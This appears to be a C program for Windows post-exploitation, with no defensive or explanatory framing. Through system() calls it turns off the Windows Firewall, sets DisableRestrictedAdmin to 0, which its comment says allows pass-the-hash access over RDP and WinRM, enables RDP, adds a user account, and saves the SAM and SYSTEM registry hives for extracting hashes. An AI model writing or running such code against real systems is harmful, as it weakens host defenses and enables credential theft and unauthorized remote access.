#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// function to create a folder to store the hashes
void createFolder(const char* folderPath) {
#ifdef _WIN32
    _mkdir(folderPath);
#else
    mkdir(folderPath, 0777);
#endif
}

void executeSystemCommand(const char* command) {
    int exitCode = system(command);
    if (exitCode == -1) {
        printf("Failed to execute system command: %s\n", command);
        exit(1);
    }
}

void DisableRestrictedAdmin(){
    int result = system("reg add HKLM\\System\\CurrentControlSet\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f");
    if (result == 0) {
        printf("DisableRestrictedAdmin: Disabled successfully.\n");
    } else {
        printf("DisableRestrictedAdmin: Not Disabled.\n");
    }
}

void DisableWindowFirewall(){
     int result = system("netsh advfirewall set allprofiles state off");
    if (result == 0) {
        printf("Windows Firewall: Disabled successfully.\n");
    } else {
        printf("Windows Firewall: Not Disabled.\n");
    }
}

void EnableRDP_AddUser(){
    // char username[50];
    // printf("Enter your username: ");
    // scanf("%s", username);
    int result1 = system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    int result2 = system("net localgroup users Ur /add");
    if (result1 == 0 && result2 == 0) {
        printf("RDP Enabled and User Added to Users Group.\n");
    } else {
        printf("RDP Not Enabled and User Not Added to Users Group.\n");
    }
}

int main() {
    const char* folderPath = "RegistryBackup";
    const char* samFilePath = "RegistryBackup/SAM.save";
    const char* systemFilePath = "RegistryBackup/SYSTEM.save";

    // Disable some security features:

    // Disable "DisableRestrictedAdmin"(This allows winrm and rdp access with a hash)
    DisableRestrictedAdmin();
    // turn off Windows Firewal
    DisableWindowFirewall();
    // Enable RDP and add user to users group
    EnableRDP_AddUser();
    // Create the folder for storing the backup files
    createFolder(folderPath);

    // Execute the system commands to save the registry keys
    executeSystemCommand("reg save HKLM\\SAM .\\RegistryBackup\\SAM.save");
    executeSystemCommand("reg save HKLM\\SYSTEM .\\RegistryBackup\\SYSTEM.save");

    printf("Registry backup files saved successfully.\n");
    return 0;
}
